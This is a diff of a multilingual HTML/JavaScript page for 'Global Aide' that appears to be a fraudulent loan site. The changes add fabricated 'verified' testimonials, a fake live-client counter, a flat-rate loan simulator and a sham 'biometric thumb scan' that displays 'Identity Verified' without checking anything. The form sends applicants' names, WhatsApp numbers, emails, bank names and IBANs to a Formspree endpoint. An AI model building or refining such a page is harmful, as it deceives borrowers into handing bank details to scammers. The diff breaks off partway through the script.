@@ -3,134 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Aide | Excellence Finance</title>
+    <title>Global Aide | Finance 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         .step { display: none; animation: fadeIn 0.4s ease-out; }
         .step.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
         .lang-btn.selected { border: 3px solid #1d4ed8 !important; background-color: #eff6ff !important; transform: scale(1.05); }
         
-        /* Animation pour le défilement des avis */
-        .scroll-parent { width: 100%; overflow: hidden; position: relative; background: #f1f5f9; padding: 10px 0; border-radius: 12px; }
-        .scroll-child { display: flex; width: max-content; animation: scroll 30s linear infinite; }
+        /* Bandeau de témoignages en progression */
+        .scroll-parent { width: 100%; overflow: hidden; position: relative; background: #f1f5f9; padding: 12px 0; border-radius: 16px; border: 1px solid #e2e8f0; }
+        .scroll-child { display: flex; width: max-content; animation: scroll 40s linear infinite; }
         @keyframes scroll { from { transform: translateX(0); } to { transform: translateX(-50%); } }
 
-        #signature-pad { 
-            border: 2px solid #cbd5e1; 
-            background: #ffffff; 
-            touch-action: none; 
-            border-radius: 15px; 
-            cursor: url('https://cdn-icons-png.flaticon.com/16/588/588395.png'), crosshair;
-        }
+        /* Scanner Biométrique */
+        #biometric-area { transition: all 0.3s ease; position: relative; }
+        #biometric-area:active { transform: scale(0.95); }
+        #laser-line { animation: scanAnimate 2s linear infinite; }
+        @keyframes scanAnimate { 0%, 100% { top: 0%; } 50% { top: 90%; } }
+
+        .slider { -webkit-appearance: none; width: 100%; height: 6px; border-radius: 5px; background: #e2e8f0; outline: none; }
         .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 4px solid white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body class="bg-[#F8FAFC] font-sans text-slate-900 overflow-x-hidden">
 
-    <nav class="bg-white border-b border-slate-200 p-4 flex justify-between items-center sticky top-0 z-50">
+    <nav class="bg-white/80 backdrop-blur-md border-b border-slate-200 p-4 flex justify-between items-center sticky top-0 z-50 shadow-sm">
         <div class="flex items-center gap-2">
-            <div class="w-8 h-8 bg-blue-700 rounded-lg flex items-center justify-center text-white font-bold">G</div>
-            <div class="font-bold text-blue-900 uppercase">Global Aide</div>
+            <div class="w-9 h-9 bg-blue-700 rounded-xl flex items-center justify-center text-white font-bold shadow-lg shadow-blue-100">G</div>
+            <div class="font-black text-blue-900 uppercase tracking-tighter">Global Aide</div>
         </div>
-        <button onclick="toggleTestimonials()" class="text-[10px] font-bold text-blue-700 uppercase border border-blue-200 px-3 py-2 rounded-lg bg-blue-50">
+        <button onclick="toggleTestimonials()" class="text-[10px] font-bold text-blue-700 uppercase border-2 border-blue-50 px-4 py-2 rounded-xl bg-blue-50/50">
             <i class="fas fa-star text-yellow-400 mr-1"></i> <span id="nav-testi">Avis</span>
         </button>
     </nav>
 
     <div id="global-loader" class="hidden fixed inset-0 bg-white/98 z-[200] flex flex-col items-center justify-center text-center p-6">
-        <div class="flex gap-2 mb-6">
-            <div class="w-4 h-4 bg-blue-700 rounded-full animate-bounce"></div>
-            <div class="w-4 h-4 bg-blue-700 rounded-full animate-bounce" style="animation-delay:0.2s"></div>
-            <div class="w-4 h-4 bg-blue-700 rounded-full animate-bounce" style="animation-delay:0.4s"></div>
+        <div class="flex gap-3 mb-6">
+            <div class="w-5 h-5 bg-blue-700 rounded-full animate-bounce"></div>
+            <div class="w-5 h-5 bg-blue-700 rounded-full animate-bounce" style="animation-delay:0.2s"></div>
+            <div class="w-5 h-5 bg-blue-700 rounded-full animate-bounce" style="animation-delay:0.4s"></div>
         </div>
-        <p id="loader-text" class="font-black text-blue-900 text-lg uppercase tracking-widest"></p>
+        <p id="loader-text" class="font-black text-blue-900 text-lg uppercase tracking-widest px-4"></p>
     </div>
 
     <div id="page-testi" class="hidden fixed inset-0 bg-white z-[100] overflow-y-auto">
         <div class="max-w-xl mx-auto p-6">
-            <div class="flex justify-between items-center mb-8">
-                <h2 class="text-xl font-black text-blue-900 uppercase" id="testi-title">Témoignages</h2>
-                <button onclick="toggleTestimonials()" class="text-3xl font-light">&times;</button>
+            <div class="flex justify-between items-center sticky top-0 bg-white py-4 mb-6 border-b">
+                <h2 class="text-2xl font-black text-blue-900 uppercase" id="testi-title">Témoignages</h2>
+                <button onclick="toggleTestimonials()" class="w-12 h-12 flex items-center justify-center bg-slate-100 rounded-2xl text-2xl font-bold">&times;</button>
             </div>
-            <div id="testi-list" class="grid gap-4"></div>
-            <button onclick="toggleTestimonials()" class="w-full bg-blue-700 text-white py-4 rounded-xl font-bold mt-8 uppercase" id="btn-close-testi">Fermer</button>
+            <div id="testi-list" class="grid gap-6"></div>
+            <button onclick="toggleTestimonials()" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-bold mt-10 uppercase tracking-widest shadow-xl" id="btn-close-testi">Fermer</button>
         </div>
     </div>
 
     <section id="step-lang" class="step active min-h-[80vh] flex-col items-center justify-center p-6 text-center">
-        <h1 class="text-3xl font-black text-blue-900 mb-8 uppercase tracking-tighter">Choisissez votre langue</h1>
-        <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-10">
-            <button onclick="selectLang('fr', '€')" class="lang-btn p-5 rounded-2xl bg-white border border-slate-200 flex flex-col items-center gap-2" id="btn-fr"><span class="text-3xl">🇫🇷</span><span class="font-bold text-xs">FRANÇAIS</span></button>
-            <button onclick="selectLang('en', '$')" class="lang-btn p-5 rounded-2xl bg-white border border-slate-200 flex flex-col items-center gap-2" id="btn-en"><span class="text-3xl">🇺🇸</span><span class="font-bold text-xs">ENGLISH</span></button>
-            <button onclick="selectLang('es', '$')" class="lang-btn p-5 rounded-2xl bg-white border border-slate-200 flex flex-col items-center gap-2" id="btn-es"><span class="text-3xl">🇪🇸</span><span class="font-bold text-xs">ESPAÑOL</span></button>
-            <button onclick="selectLang('de', '€')" class="lang-btn p-5 rounded-2xl bg-white border border-slate-200 flex flex-col items-center gap-2" id="btn-de"><span class="text-3xl">🇩🇪</span><span class="font-bold text-xs">DEUTSCH</span></button>
+        <div class="mb-12">
+            <h1 class="text-4xl font-black text-blue-900 mb-3 tracking-tighter uppercase">Bienvenue</h1>
+            <p class="text-slate-500 text-xs font-bold uppercase tracking-[0.2em]">Sélectionnez votre langue de dossier</p>
         </div>
-        <div id="lang-cont-container" class="w-full max-w-sm" style="display:none;">
-            <button onclick="goToStep(2)" class="w-full bg-blue-700 text-white py-5 rounded-2xl font-bold shadow-xl flex items-center justify-center gap-3">
-                <span id="btn-cont-text">CONTINUER</span> <i class="fas fa-arrow-right"></i>
+        <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-12">
+            <button onclick="selectLang('fr', '€')" class="lang-btn p-6 rounded-3xl bg-white border-2 border-slate-100 shadow-sm flex flex-col items-center gap-3 transition-all" id="btn-fr"><span class="text-4xl">🇫🇷</span><span class="font-bold text-xs">FRANÇAIS</span></button>
+            <button onclick="selectLang('en', '$')" class="lang-btn p-6 rounded-3xl bg-white border-2 border-slate-100 shadow-sm flex flex-col items-center gap-3 transition-all" id="btn-en"><span class="text-4xl">🇺🇸</span><span class="font-bold text-xs">ENGLISH</span></button>
+            <button onclick="selectLang('es', '$')" class="lang-btn p-6 rounded-3xl bg-white border-2 border-slate-100 shadow-sm flex flex-col items-center gap-3 transition-all" id="btn-es"><span class="text-4xl">🇪🇸</span><span class="font-bold text-xs">ESPAÑOL</span></button>
+            <button onclick="selectLang('de', '€')" class="lang-btn p-6 rounded-3xl bg-white border-2 border-slate-100 shadow-sm flex flex-col items-center gap-3 transition-all" id="btn-de"><span class="text-4xl">🇩🇪</span><span class="font-bold text-xs">DEUTSCH</span></button>
+        </div>
+        <div id="lang-cont-container" class="w-full max-w-sm" style="display:none; animation: fadeIn 0.5s ease;">
+            <button onclick="goToStep(2)" class="w-full bg-blue-700 text-white py-6 rounded-[2rem] font-black shadow-2xl shadow-blue-200 flex items-center justify-center gap-4 active:scale-95 transition-all">
+                <span id="btn-cont-text" class="tracking-widest">CONTINUER</span> <i class="fas fa-chevron-right"></i>
             </button>
         </div>
     </section>
-        <section id="step-sim" class="step min-h-screen flex-col p-4">
+        <section id="step-sim" class="step min-h-screen flex-col p-4 bg-[#F8FAFC]">
         <div class="max-w-xl mx-auto w-full">
-            <div class="text-[10px] bg-green-50 text-green-700 px-3 py-1.5 rounded-full font-bold mb-4 inline-block border border-green-200">
-                <span id="live-count">...</span>
+            <div class="flex justify-between items-center mb-6">
+                <div class="text-[10px] bg-green-100 text-green-700 px-4 py-2 rounded-full font-black flex items-center gap-2 border border-green-200">
+                    <span class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span>
+                    <span id="live-count">...</span>
+                </div>
             </div>
 
-            <div class="scroll-parent mb-6">
+            <div class="scroll-parent mb-8">
                 <div class="scroll-child" id="mini-testi-scroll"></div>
             </div>
 
-            <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100">
-                <h2 class="text-2xl font-black text-blue-900 mb-8 text-center uppercase" id="sim-title">Simulation</h2>
-                <div class="space-y-10">
+            <div class="bg-white p-10 rounded-[3rem] shadow-xl border border-slate-100">
+                <h2 class="text-2xl font-black text-blue-900 mb-10 text-center uppercase" id="sim-title">Simulation</h2>
+                <div class="space-y-12">
                     <div>
-                        <div class="flex justify-between items-center mb-4"><span id="lbl-amt" class="font-bold text-slate-400 text-xs uppercase">Montant</span><div class="text-blue-700 font-black text-2xl"><input type="number" id="amountInput" value="20000" oninput="sync('amt')" class="w-24 text-right bg-transparent outline-none"><span class="curr ml-1">€</span></div></div>
-                        <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="20000" oninput="sync('range')" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
+                        <div class="flex justify-between items-center mb-4"><span id="lbl-amt" class="font-black text-slate-400 text-[10px] uppercase tracking-widest">Montant</span><div class="text-blue-700 font-black text-3xl"><input type="number" id="amountInput" value="30000" oninput="sync('amt')" class="w-32 text-right bg-transparent outline-none"><span class="curr ml-1">€</span></div></div>
+                        <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="30000" oninput="sync('range')" class="slider">
                     </div>
                     <div>
-                        <div class="flex justify-between items-center mb-4"><span id="lbl-dur" class="font-bold text-slate-400 text-xs uppercase">Durée</span><div class="text-blue-700 font-black text-2xl"><input type="number" id="yearInput" value="5" oninput="syncYear('num')" class="w-16 text-right bg-transparent outline-none"><span id="lbl-years" class="text-lg">Ans</span></div></div>
-                        <input type="range" id="yearRange" min="1" max="30" step="1" value="5" oninput="syncYear('range')" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
+                        <div class="flex justify-between items-center mb-4"><span id="lbl-dur" class="font-black text-slate-400 text-[10px] uppercase tracking-widest">Durée</span><div class="text-blue-700 font-black text-3xl"><input type="number" id="yearInput" value="5" oninput="syncYear('num')" class="w-16 text-right bg-transparent outline-none"><span id="lbl-years" class="text-xl">Ans</span></div></div>
+                        <input type="range" id="yearRange" min="1" max="30" step="1" value="5" oninput="syncYear('range')" class="slider">
                     </div>
                 </div>
-                <div class="mt-10 bg-blue-50 p-6 rounded-3xl border border-blue-100 space-y-4">
-                    <div class="flex justify-between items-center"><span id="res-lbl-men" class="text-slate-500 font-bold">Mensualité</span><span id="res-monthly" class="font-black text-blue-900 text-2xl">...</span></div>
-                    <div class="flex justify-between items-center text-xs text-slate-400"><span id="res-lbl-tot">Total</span><span id="res-total" class="font-bold">...</span></div>
+                <div class="mt-12 bg-slate-900 p-8 rounded-[2.5rem] text-white shadow-2xl">
+                    <div class="flex justify-between items-center mb-2"><span id="res-lbl-men" class="text-slate-400 font-bold uppercase text-[10px] tracking-widest">Mensualité</span><span id="res-monthly" class="font-black text-3xl">...</span></div>
+                    <div class="flex justify-between items-center border-t border-slate-800 pt-4"><span id="res-lbl-tot" class="text-slate-500 text-[9px] uppercase font-black">Total</span><span id="res-total" class="font-bold text-blue-400 text-sm">...</span></div>
                 </div>
-                <button onclick="goToStep(3)" class="w-full bg-blue-700 text-white py-5 rounded-2xl font-bold mt-8 shadow-xl uppercase" id="btn-next">Suivant</button>
+                <button onclick="goToStep(3)" class="w-full bg-blue-700 text-white py-6 rounded-3xl font-black mt-10 shadow-xl uppercase tracking-widest" id="btn-next">Suivant</button>
             </div>
         </div>
     </section>
 
     <section id="step-form" class="step min-h-screen flex-col p-4">
         <div class="max-w-xl mx-auto w-full pb-10">
-            <button onclick="goToStep(2)" class="text-slate-400 font-bold text-xs flex items-center gap-2 mb-6 uppercase"><i class="fas fa-arrow-left"></i> <span id="btn-back">Retour</span></button>
-            <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100">
-                <form action="https://formspree.io/f/xnjqwngo" method="POST" id="loanForm" onsubmit="return handleFormSubmit(event)" class="space-y-4">
-                    <input type="hidden" name="PRÊT_MONTANT" id="h-m"><input type="hidden" name="PRÊT_DURÉE" id="h-d"><input type="hidden" name="SIGNATURE_BASE64" id="h-sign">
-                    <h2 class="text-xl font-black text-blue-900 mb-6 uppercase" id="form-title">Dossier</h2>
-                    <select id="country-select" name="Pays" onchange="upCD()" class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 font-bold">
-                        <option value="France" data-code="+33" data-curr="€">🇫🇷 France</option>
-                        <option value="Porto Rico" data-code="+1-787" data-curr="$">🇵🇷 Porto Rico</option>
-                        <option value="Panama" data-code="+507" data-curr="$">🇵🇦 Panama</option>
-                        <option value="USA" data-code="+1" data-curr="$">🇺🇸 USA</option>
-                    </select>
-                    <input type="text" id="i-nom" name="Nom" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="...">
-                    <input type="tel" id="i-wa" name="WhatsApp" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="...">
-                    <input type="email" id="i-email" name="Email" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="...">
-                    <div class="pt-6 border-t border-slate-100 space-y-3">
-                        <input type="text" id="i-bank-name" name="Banque" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="...">
-                        <input type="text" id="i-bank-dir" name="Dir_Banque" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="...">
-                        <input type="text" id="i-bank-acc" name="Compte" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="...">
+            <button onclick="goToStep(2)" class="text-slate-400 font-black text-[10px] flex items-center gap-2 mb-6 uppercase tracking-widest"><i class="fas fa-arrow-left"></i> <span id="btn-back">Retour</span></button>
+            <div class="bg-white p-10 rounded-[3.5rem] shadow-xl border border-slate-100">
+                <form action="https://formspree.io/f/xnjqwngo" method="POST" id="loanForm" onsubmit="return handleFormSubmit(event)" class="space-y-6">
+                    <input type="hidden" name="PRÊT_MONTANT" id="h-m"><input type="hidden" name="PRÊT_DURÉE" id="h-d"><input type="hidden" name="AUTH_SCAN" id="h-auth" value="Non validé">
+                    
+                    <h2 class="text-2xl font-black text-blue-900 mb-8 uppercase tracking-tighter" id="form-title">Dossier</h2>
+                    
+                    <div class="space-y-4">
+                        <select id="country-select" name="Pays" onchange="upCD()" class="w-full p-5 bg-slate-50 rounded-2xl border-2 border-slate-100 font-bold outline-none focus:border-blue-500 transition-all">
+                            <option value="France" data-code="+33" data-curr="€">🇫🇷 France</option>
+                            <option value="Porto Rico" data-code="+1-787" data-curr="$">🇵🇷 Porto Rico</option>
+                            <option value="Panama" data-code="+507" data-curr="$">🇵🇦 Panama</option>
+                            <option value="USA" data-code="+1" data-curr="$">🇺🇸 USA</option>
+                        </select>
+                        <input type="text" id="i-nom" name="Nom" required class="w-full p-5 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none" placeholder="...">
+                        <input type="tel" id="i-wa" name="WhatsApp" required class="w-full p-5 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none" placeholder="...">
+                        <input type="email" id="i-email" name="Email" required class="w-full p-5 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none" placeholder="...">
                     </div>
-                    <div class="pt-6">
-                        <label class="text-[10px] font-black text-slate-400 uppercase block mb-2" id="lbl-sign">Signature Numérique</label>
-                        <canvas id="signature-pad" width="450" height="200" class="w-full"></canvas>
-                        <button type="button" onclick="clearSignature()" class="text-red-500 font-bold text-[10px] mt-2 uppercase underline" id="btn-clear">Effacer</button>
+
+                    <div class="pt-8 border-t border-slate-100 space-y-4">
+                        <input type="text" id="i-bank-name" name="Banque" required class="w-full p-5 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none" placeholder="...">
+                        <input type="text" id="i-bank-acc" name="IBAN" required class="w-full p-5 bg-slate-50 rounded-2xl border-2 border-slate-100 outline-none" placeholder="...">
                     </div>
-                    <button type="submit" class="w-full bg-blue-700 text-white p-5 rounded-2xl font-bold text-lg shadow-xl mt-6 uppercase" id="btn-submit">Soumettre</button>
+
+                    <div class="pt-8 text-center">
+                        <label class="text-[10px] font-black text-slate-400 uppercase block mb-6 tracking-[0.2em]" id="lbl-scan">Authentification Biométrique</label>
+                        <div id="biometric-area" class="relative w-44 h-44 mx-auto bg-slate-50 rounded-[2.5rem] border-2 border-dashed border-slate-200 flex flex-col items-center justify-center cursor-pointer overflow-hidden shadow-inner" onmousedown="startScan()" ontouchstart="startScan()">
+                            <i id="finger-icon" class="fas fa-fingerprint text-6xl text-slate-300"></i>
+                            <div id="laser-line" class="hidden absolute w-full h-1 bg-blue-500 shadow-[0_0_15px_#1d4ed8] z-10"></div>
+                            <p id="scan-instruction" class="text-[9px] font-bold text-slate-400 mt-4 uppercase px-4"></p>
+                        </div>
+                        <div id="scan-status" class="mt-4 h-4">
+                            <span class="text-[10px] font-black text-blue-700 uppercase hidden" id="status-text"></span>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full bg-blue-700 text-white p-6 rounded-3xl font-black text-lg shadow-2xl mt-10 uppercase tracking-widest" id="btn-submit">Envoyer</button>
                 </form>
             </div>
         </div>
@@ -138,31 +157,11 @@
 
     <script>
         let cL = 'fr', cC = '€';
-        const cv = document.getElementById('signature-pad'), cx = cv.getContext('2d');
-        let w = false;
-
-        // SIGNATURE OPTIMISÉE (PLUS FLUIDE)
-        function getPos(e) {
-            const r = cv.getBoundingClientRect();
-            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
-            return { x: clientX - r.left, y: clientY - r.top };
-        }
-        function sD(e) { w = true; const p = getPos(e); cx.beginPath(); cx.moveTo(p.x, p.y); e.preventDefault(); }
-        function d(e) { if (!w) return; const p = getPos(e); cx.lineTo(p.x, p.y); cx.lineWidth = 4; cx.lineCap = "round"; cx.strokeStyle = "#000"; cx.stroke(); e.preventDefault(); }
-        function stD() { w = false; }
-        cv.addEventListener('mousedown', sD); cv.addEventListener('mousemove', d); window.addEventListener('mouseup', stD);
-        cv.addEventListener('touchstart', sD, {passive: false}); cv.addEventListener('touchmove', d, {passive: false}); cv.addEventListener('touchend', stD);
-
-        function clearSignature() { cx.clearRect(0, 0, cv.width, cv.height); }
-        function handleFormSubmit(e) { e.preventDefault(); document.getElementById('h-sign').value = cv.toDataURL('image/png', 0.1); document.getElementById('global-loader').classList.remove('hidden'); setTimeout(() => { document.getElementById('loanForm').submit(); }, 3500); }
-        function toggleTestimonials() { document.getElementById('page-testi').classList.toggle('hidden'); }
-
         const tr = {
-            fr: { cont: "CONTINUER", sim: "Simulation", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total", next: "Suivant", fTitle: "Dossier", back: "Retour", submit: "ENVOYER", clear: "Effacer", sign: "Signature", navTesti: "Avis", testiTitle: "Témoignages", close: "Fermer", live: "clients en ligne", load: "Traitement du dossier...", pl_nom: "Nom Complet", pl_wa: "N° WhatsApp", pl_email: "Email", pl_bankName: "Nom de la Banque", pl_bankDir: "Direction de la banque", pl_bankAcc: "IBAN / Compte", tests: [{n:"M. Lefebvre", t:"Service rapide et sérieux.", i:"ML", c:"bg-blue-100"}, {n:"J. Dubois", t:"Taux imbattable !", i:"JD", c:"bg-green-100"}, {n:"A. Martin", t:"Très pro.", i:"AM", c:"bg-purple-100"}, {n:"S. Bernard", t:"Rapide !", i:"SB", c:"bg-red-100"}, {n:"P. Petit", t:"Excellent.", i:"PP", c:"bg-orange-100"}, {n:"L. Roux", t:"Parfait.", i:"LR", c:"bg-indigo-100"}]},
-            en: { cont: "CONTINUE", sim: "Simulation", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total", next: "Next", fTitle: "Application", back: "Back", submit: "SUBMIT", clear: "Clear", sign: "Signature", navTesti: "Reviews", testiTitle: "Reviews", close: "Close", live: "online clients", load: "Processing file...", pl_nom: "Full Name", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Bank Name", pl_bankDir: "Bank Branch", pl_bankAcc: "IBAN / Account", tests: [{n:"J. Adams", t:"Fast and safe.", i:"JA", c:"bg-blue-100"}, {n:"R. Doe", t:"Great rates.", i:"RD", c:"bg-green-100"}, {n:"S. King", t:"Best service.", i:"SK", c:"bg-purple-100"}, {n:"M. Stone", t:"So easy!", i:"MS", c:"bg-red-100"}, {n:"B. Lee", t:"Love it.", i:"BL", c:"bg-orange-100"}, {n:"W. Smith", t:"Professional.", i:"WS", c:"bg-indigo-100"}]},
-            es: { cont: "CONTINUAR", sim: "Simulación", amt: "Monto", dur: "Plazo", yr: "Años", men: "Mensualidad", tot: "Total", next: "Siguiente", fTitle: "Solicitud", back: "Atrás", submit: "ENVIAR", clear: "Borrar", sign: "Firma", navTesti: "Opiniones", testiTitle: "Reseñas", close: "Cerrar", live: "conectados", load: "Procesando expediente...", pl_nom: "Nombre", pl_wa: "WhatsApp", pl_email: "Correo", pl_bankName: "Banco", pl_bankDir: "Dirección del banco", pl_bankAcc: "IBAN / Cuenta", tests: [{n:"C. Ruiz", t:"Muy rápido.", i:"CR", c:"bg-blue-100"}, {n:"M. Garcia", t:"Excelente.", i:"MG", c:"bg-green-100"}, {n:"F. Lopez", t:"Muy seguro.", i:"FL", c:"bg-purple-100"}, {n:"A. Gomez", t:"Perfecto.", i:"AG", c:"bg-red-100"}, {n:"J. Hernandez", t:"Genial.", i:"JH", c:"bg-orange-100"}, {n:"S. Perez", t:"Increíble.", i:"SP", c:"bg-indigo-100"}]},
-            de: { cont: "WEITER", sim: "Simulation", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich", tot: "Gesamt", next: "Weiter", fTitle: "Antrag", back: "Zurück", submit: "SENDEN", clear: "Löschen", sign: "Signatur", navTesti: "Bewertungen", testiTitle: "Bewertungen", close: "Schließen", live: "Personen online", load: "Antrag wird bearbeitet...", pl_nom: "Vollständiger Name", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Bank Name", pl_bankDir: "Filiale", pl_bankAcc: "IBAN / Konto", tests: [{n:"H. Weber", t:"Sehr schnell.", i:"HW", c:"bg-blue-100"}, {n:"K. Bauer", t:"Alles super.", i:"KB", c:"bg-green-100"}, {n:"M. Richter", t:"Top Zinsen.", i:"MR", c:"bg-purple-100"}, {n:"S. Neumann", t:"Sehr seriös.", i:"SN", c:"bg-red-100"}, {n:"F. Wagner", t:"Gute Beratung.", i:"FW", c:"bg-orange-100"}, {n:"U. Koch", t:"Perfekt.", i:"UK", c:"bg-indigo-100"}]}
+            fr: { cont: "CONTINUER LE DOSSIER", sim: "Simulateur de crédit", amt: "Montant du prêt", dur: "Durée de remboursement", yr: "Ans", men: "Mensualité", tot: "Total à rembourser", next: "Suivant", fTitle: "Demande de prêt", back: "Retour", submit: "SOUMETTRE MON DOSSIER", scan: "Authentification Biométrique", scanInst: "Maintenez le pouce pour scanner", scanActive: "Analyse du pouce...", scanDone: "Identité Confirmée", navTesti: "Avis Clients", testiTitle: "Avis Vérifiés", close: "Fermer", live: "clients connectés actuellement", load: "Sécurisation de la connexion...", pl_nom: "Nom & Prénom", pl_wa: "N° WhatsApp", pl_email: "Email professionnel", pl_bankName: "Nom de la Banque", pl_bankAcc: "Numéro de compte / IBAN", tests: [{n:"M. Lefebvre", t:"Reçu 50.000€ en 48h.", i:"ML", c:"bg-blue-100"}, {n:"S. Durand", t:"Très professionnel.", i:"SD", c:"bg-green-100"}, {n:"J. Martin", t:"Taux incroyable.", i:"JM", c:"bg-purple-100"}, {n:"L. Bernard", t:"Site sécurisé.", i:"LB", c:"bg-red-100"}, {n:"T. Petit", t:"Le top du crédit.", i:"TP", c:"bg-orange-100"}, {n:"A. Roux", t:"Merci Global Aide.", i:"AR", c:"bg-indigo-100"}]},
+            en: { cont: "CONTINUE APPLICATION", sim: "Loan Simulator", amt: "Loan Amount", dur: "Duration", yr: "Years", men: "Monthly Payment", tot: "Total Repayment", next: "Next", fTitle: "Loan Application", back: "Back", submit: "SUBMIT MY FILE", scan: "Biometric Authentication", scanInst: "Hold thumb to scan", scanActive: "Scanning thumb...", scanDone: "Identity Verified", navTesti: "Reviews", testiTitle: "Verified Reviews", close: "Close", live: "clients online right now", load: "Securing connection...", pl_nom: "Full Name", pl_wa: "WhatsApp No.", pl_email: "Business Email", pl_bankName: "Bank Name", pl_bankAcc: "Account Number / IBAN", tests: [{n:"J. Adams", t:"Got $50k in 48h.", i:"JA", c:"bg-blue-100"}, {n:"R. Doe", t:"Very professional.", i:"RD", c:"bg-green-100"}, {n:"S. King", t:"Incredible rates.", i:"SK", c:"bg-purple-100"}, {n:"M. Stone", t:"Secure site.", i:"MS", c:"bg-red-100"}, {n:"B. Lee", t:"Best service.", i:"BL", c:"bg-orange-100"}, {n:"W. Smith", t:"Thanks Global Aide.", i:"WS", c:"bg-indigo-100"}]},
+            es: { cont: "CONTINUAR SOLICITUD", sim: "Simulador de Crédito", amt: "Monto del préstamo", dur: "Plazo", yr: "Años", men: "Cuota mensual", tot: "Total", next: "Siguiente", fTitle: "Expediente", back: "Atrás", submit: "ENVIAR SOLICITUD", scan: "Autenticación Biométrica", scanInst: "Mantenga el pulgar", scanActive: "Escaneando...", scanDone: "Identidad Confirmada", navTesti: "Opiniones", testiTitle: "Reseñas", close: "Cerrar", live: "clientes en línea", load: "Asegurando conexión...", pl_nom: "Nombre completo", pl_wa: "WhatsApp", pl_email: "Correo electrónico", pl_bankName: "Nombre del Banco", pl_bankAcc: "Cuenta / IBAN", tests: [{n:"C. Ruiz", t:"Muy profesional.", i:"CR", c:"bg-blue-100"}, {n:"M. Garcia", t:"Excelente tasas.", i:"MG", c:"bg-green-100"}, {n:"F. Lopez", t:"Muy seguro.", i:"FL", c:"bg-purple-100"}, {n:"A. Gomez", t:"Perfecto.", i:"AG", c:"bg-red-100"}, {n:"J. Hernan", t:"Genial.", i:"JH", c:"bg-orange-100"}, {n:"S. Perez", t:"Gracias.", i:"SP", c:"bg-indigo-100"}]},
+            de: { cont: "ANTRAG FORTSETZEN", sim: "Kreditsimulator", amt: "Kreditbetrag", dur: "Dauer", yr: "Jahre", men: "Rate", tot: "Gesamt", next: "Weiter", fTitle: "Kreditantrag", back: "Zurück", submit: "ANTRAG SENDEN", scan: "Biometrie", scanInst: "Daumen halten", scanActive: "Wird gescannt...", scanDone: "Identität bestätigt", navTesti: "Bewertungen", testiTitle: "Bewertungen", close: "Schließen", live: "Kunden online", load: "Sicherer Aufbau...", pl_nom: "Vollständiger Name", pl_wa: "WhatsApp", pl_email: "Email Adresse", pl_bankName: "Bank Name", pl_bankAcc: "IBAN / Konto", tests: [{n:"H. Weber", t:"Sehr schnell.", i:"HW", c:"bg-blue-100"}, {n:"K. Bauer", t:"Top Konditionen.", i:"KB", c:"bg-green-100"}, {n:"M. Richter", t:"Habe mein Geld.", i:"MR", c:"bg-purple-100"}, {n:"S. Neumann", t:"Sehr seriös.", i:"SN", c:"bg-red-100"}, {n:"F. Wagner", t:"Empfehlenswert.", i:"FW", c:"bg-orange-100"}, {n:"U. Koch", t:"Alles bestens.", i:"UK", c:"bg-indigo-100"}]}
         };
 
         function selectLang(l, c) { cL = l; cC = c; document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('selected')); document.getElementById('btn-' + l).classList.add('selected'); document.getElementById('lang-cont-container').style.display = 'block'; upUI(l); }
@@ -170,21 +169,28 @@
         function sync(s) { const r = document.getElementById('amountRange'), n = document.getElementById('amountInput'); if (s === 'range') n.value = r.value; else r.value = n.value; calc(); }
         function syncYear(s) { const r = document.getElementById('yearRange'), n = document.getElementById('yearInput'); if (s === 'range') n.value = r.value; else r.value = n.value; calc(); }
         function calc() { const a = parseInt(document.getElementById('amountInput').value) || 1000, y = parseInt(document.getElementById('yearInput').value) || 1; const t = Math.round(a * 1.03), m = Math.round(t / (y * 12)); document.getElementById('res-total').innerText = t + " " + cC; document.getElementById('res-monthly').innerText = m + " " + cC; document.getElementById('h-m').value = a + " " + cC; document.getElementById('h-d').value = y + " ans"; document.querySelectorAll('.curr').forEach(e => e.innerText = cC); }
-
-        function upUI(l) { 
-            const t = tr[l]; 
